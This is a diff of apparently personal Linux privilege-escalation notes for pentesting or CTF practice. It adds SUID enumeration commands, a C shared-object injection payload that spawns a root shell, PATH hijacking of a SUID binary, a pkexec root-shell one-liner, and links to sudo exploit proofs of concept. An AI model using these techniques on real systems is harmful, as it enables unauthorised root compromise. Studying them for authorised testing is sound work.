@@ -20,7 +20,7 @@ run [lse.sh](https://github.com/diego-treitos/linux-smart-enumeration) with incr
 - [ ] su root? (no password, root, password) 
 - [ ] Sudo binaries or exploits? 
 - [ ] Exploitable cronjobs?
-- [ ] Weird SUID binaries?   
+- [ ] Weird SUID/SGID binaries?   
 - [ ] Services running as root?, services only available to localhost?
 - [ ] Passwords / config files?  
 - [ ] Is the kernel vulnerable? (last resort) 
@@ -62,14 +62,15 @@ sudo su root, type password, see ******: passwd feedback enabled
 [proof of concept](https://github.com/saleemrashid/sudo-cve-2019-18634) 
 ## CVE-2021-3156 - Baron Samedit 
 [proof of concept](https://github.com/stong/CVE-2021-3156) 
+
 ## Cronjobs    
-look for scripts you can write to running as a cronjob, writeable PATH enviromental variable, wildcard expansion
+look for scripts you can write to running as a cronjob, writeable PATH directories used, wildcard expansion
 
     cat /etc/crontab  
     crontab -l    
     ls -al /etc/cron* 
 ## PATH variable 
-If a cronjob doesn’t use an absolute path and one of path dirs is writable by user: can create a script with the same name as the cron job so it executes. 
+If a cronjob doesn’t use an absolute path and one of path dirs is writable by user: can create a script with the same name as the cron job so it is executed. 
 default /usr/bin:/bin 
     echo $PATH 
     cat /etc/crontab     
@@ -80,15 +81,46 @@ default /usr/bin:/bin
 ### Wildcards 
 [Exploiting wildcards in Linux](https://www.helpnetsecurity.com/2014/06/27/exploiting-wildcards-on-linux/) 
 
-## SUID Binaries
-    find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \;  2>/dev/null                                 
+## SUID Binaries 
+    overwrite binary, use gtfobins exploits, insert missing shared object, manipulate enviromental variables 
+    find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \;  2>/dev/null     
+    find / -type f -a -perm -o+x -a \( -perm -u+s -o -perm -u+s \) -exec ls -l {} \; 2> /dev/null  
+    
 ### Custom Executable
     int main(){
         setuid(0);
         system("/bin/bash -p");
-    }
+    }  
+### Shared Object Injection 
+look for missing shared objects searched for in writable directories 
+    strace [suid binary] 2>&1 | grep -iE “open|access|no such file” 
+    [missing shared object].c 
+    #include <stdio.h> 
+    #include <stdlib.h> 
+    static void inject() __attribute__((constructor));  
+    void inject(){ 
+     setuid(0); 
+     system("/bin/bash -p"); 
+    } 
+    
+    gcc -shared -fPIC -o [missing shared object].so [missing shared object].c 
+    run suid binary 
+### PATH Enviromental Variables 
+SUID /SGID binary tries to execute another file without absolute path? -> change PATH var 
+    strings [suid binary] 
+    strace -v -f -e execve [suid binary] 2>&1 | grep exec 
+    ltrace [suid binary]  
+    
+compile custom executable with name of file suid binary is calling
+set PATH variable to current directory and run suid binary  
+
+    PATH=.:$PATH /usr/local/bin/suid-env
+
+### Misc SUID binaries 
+    pkexec --user root /bin/sh 
 ## Services Running as Root / Services Only Running Locally
-    ps -aux | grep root
+    ps -aux | grep root 
+    netstat -etulp 
     mysql running as root [exploit](https://www.exploit-db.com/exploits/1518)  
     ftp, telnet - tcpdump to sniff creds??
 ## Passwords / config files 
